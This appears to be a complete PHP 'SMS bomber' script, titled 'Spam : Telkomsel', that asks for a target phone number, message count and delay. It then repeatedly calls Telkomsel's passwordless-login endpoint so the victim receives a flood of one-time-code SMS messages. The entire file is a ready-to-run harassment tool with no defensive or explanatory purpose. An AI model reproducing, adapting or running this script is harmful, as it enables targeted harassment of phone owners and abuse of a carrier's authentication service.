<?php
function telkbomb($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
$H = "\e[91m";
$K = "\e[92m";
$P = "\e[0m";

echo "
=====================================
Code : Php
Spam : Telkomsel =====================================
\n";

echo "$H[>]$K Nomor Target:$P ";
$nomor = trim(fgets(STDIN));
echo "$H[>]$K Jumlah Pesan:$P ";
$jumlah = trim(fgets(STDIN));
echo "$H[>]$K Jeda > Waktu:$P ";
$jeda = trim(fgets(STDIN));
$execute = telkbomb($nomor, $jumlah, $jeda);
print $execute;
?>
